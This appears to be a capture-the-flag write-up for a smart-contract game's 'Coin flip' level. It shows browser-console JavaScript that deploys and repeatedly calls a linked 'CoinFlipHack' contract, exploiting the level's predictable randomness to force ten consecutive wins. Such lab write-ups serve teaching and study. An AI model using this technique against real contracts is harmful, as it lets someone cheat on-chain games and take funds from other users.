# Coin flip

Type in the browser console:

```
> web3.utils.toNumber(await contract.consecutiveWins())
0
```

Deploy a contract with Remix using attached Solidity files ([interfaces/ICoinFlip.sol](./src/interfaces/ICoinFlip.sol) and [contracts/CoinFlipHack.sol](./src/contracts/CoinFlipHack.sol)).

Copy the ABI and deployed contract address from Remix and run the following code in the browser console:

```
var abi = [
  {
    "inputs": [],
    "name": "doFlip",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_coinFlipAddress",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  }
];
var hackAddress = "*redacted*";
var hack = new web3.eth.Contract(abi, hackAddress);

for (var i = 0; i < 10; i++) {
  await hack.methods.doFlip().send({ from: player });
}
```

Type in the browser console:

```
> web3.utils.toNumber(await contract.consecutiveWins())
10
```

Level finished.
